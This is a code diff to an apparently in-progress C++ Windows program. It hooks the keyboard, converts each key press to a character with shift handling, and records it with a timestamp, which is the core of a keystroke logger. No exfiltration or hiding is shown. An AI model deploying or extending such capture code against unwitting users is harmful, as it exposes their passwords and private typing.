@@ -8,7 +8,8 @@
 #include <chrono>
 #include <ctime>
 #include <vector>
-
+#include <sstream>
+#include <winuser.h>
 
 HHOOK keyboardHook = NULL;
 std::vector<std::pair<std::string, std::wstring>> keystrokeVector;
@@ -47,6 +48,34 @@ std::string GetTimestap() {
     return std::string(buffer);
 }
 
+wchar_t VirtualKeyTochar(DWORD vkCode, bool shiftPressed) {
+    BYTE keyboardState[256]; // Buffer of all the 256 possible virtual keyboard states in windows. 
+    GetKeyboardState(keyboardState); // Fill the array with the current keyboard state. 
+
+    if (shiftPressed) {
+        keyboardState[VK_SHIFT] = 0x80;
+    } else {
+        keyboardState[VK_SHIFT] = 0;
+    }
+
+    // Can change size later if needed. 
+    wchar_t buffer[256] = {0}; // Buffer holding the resulting unicode characters.
+    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC); // Consider different versions of MapVirtualKey.
+    int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 256, 0);
+
+    // result equal to 1 means translation from vkcode to unicode successfull. 
+    if (result > 0) {
+        std::wcout << L"Buffer: " << buffer << L" Result: " << result << "\n";
+        return buffer[0];
+    } else if (result == -1) {
+        std::wcout << L"Dead key or special state encountered. \n"; 
+    }
+
+    // Consider returning a spesific key when this happens? 
+    return 0;
+}
+
+
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0) {
@@ -61,43 +90,30 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             if (!keyStates[vkCode]) {
                 keyStates[vkCode] = true;
 
-                DWORD scanCode = kbdStruct->scanCode;
-                DWORD flags = kbdStruct->flags; 
-                wchar_t buffer[256] = {0};
-                BYTE keyboardState[256];
 
-                if (GetKeyboardState(keyboardState)) {
-                    int unicodeStatus = ToUnicode(vkCode, scanCode, keyboardState, buffer, 255, flags); 
-                    // Do more reseach on this function, why we need all the parameters.  
-                    
-                    std::string timestamp = GetTimestap();
-                    std::wstring keypress; 
+                // Checks if the shift key is pressen. TODO: understand why we use this notation.
+                bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
 
-                    if (unicodeStatus > 0) {
-                        keypress = buffer;
-                        //std::wcout << L"The character: " << buffer[0] << L" was pressed. \n"; 
-                    }
-                    else {
-                        
-                        keypress = L"[VK:" + std::to_wstring(vkCode) + L"]";
-                        //std::cout << "The key " << vkCode << " was pressed" << std::endl;
-                    }
+                wchar_t character = VirtualKeyTochar(vkCode, shiftPressed);
+                std::string timestamp = GetTimestap();
+                std::wstring keypress;
 
-                    keystrokeVector.emplace_back(timestamp, keypress);
-                }  
-            
-                else {
-                    std::cerr << "Failed to get keyboard state: " << GetLastError();
+                if (character != 0) {
+                    keypress = character; 
+                } else {
+                    keypress = L"[VK:" + std::to_wstring(vkCode) + L"]";
                 }
-            }
-            
-            }
+
+                keystrokeVector.emplace_back(timestamp, keypress);               
+            }    
+        }
+            //Log that a key has been released.        
             else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
                 keyStates[vkCode] = false; 
-                } 
+            } 
     }
         
-        return CallNextHookEx(keyboardHook, nCode, wParam, lParam); 
+    return CallNextHookEx(keyboardHook, nCode, wParam, lParam); 
 }
 
 
